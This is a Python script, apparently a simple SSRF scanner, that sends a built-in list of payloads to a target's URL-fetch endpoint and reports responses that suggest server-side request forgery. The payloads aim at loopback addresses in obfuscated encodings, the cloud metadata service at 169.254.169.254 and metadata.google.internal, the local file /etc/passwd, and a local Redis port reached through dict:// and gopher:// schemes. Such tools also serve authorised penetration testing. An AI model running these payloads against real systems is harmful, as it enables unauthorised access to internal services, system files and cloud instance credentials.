#!/usr/bin/env python3
"""
SSRF Scanner
Usage: python ssrf_scanner.py https://target.com/urlfetch
"""

import sys
import requests
import urllib.parse

class SSRFScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # SSRF payloads
        self.payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://169.254.169.254',
            'http://metadata.google.internal',
            'http://2130706433',
            'http://0x7f000001',
            'http://[::1]',
            'file:///etc/passwd',
            'dict://127.0.0.1:6379',
            'gopher://127.0.0.1:6379/_INFO',
        ]
    
    def test_payload(self, payload):
        """Test a payload"""
        try:
            data = {'url': payload}
            r = requests.post(self.url, data=data, timeout=10)
            
            # Check for SSRF indicators
            indicators = ['localhost', '127.0.0.1', 'meta-data', 'ami-id', 'instance-id']
            for ind in indicators:
                if ind in r.text:
                    return {'payload': payload, 'indicator': ind}
            
            if r.status_code == 200 and len(r.text) > 0:
                return {'payload': payload, 'response': len(r.text)}
            
        except Exception as e:
            return {'error': str(e)}
        
        return None
    
    def scan(self):
        """Scan for SSRF"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result and 'indicator' in result:
                print(f"[!] Possible SSRF: {payload}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python ssrf_scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = SSRFScanner(url)
    findings = scanner.scan()
    
    if findings:
        print(f"\n[!] Found {len(findings)} potential SSRF")
    else:
        print("\n[*] No SSRF found")


if __name__ == "__main__":
    main()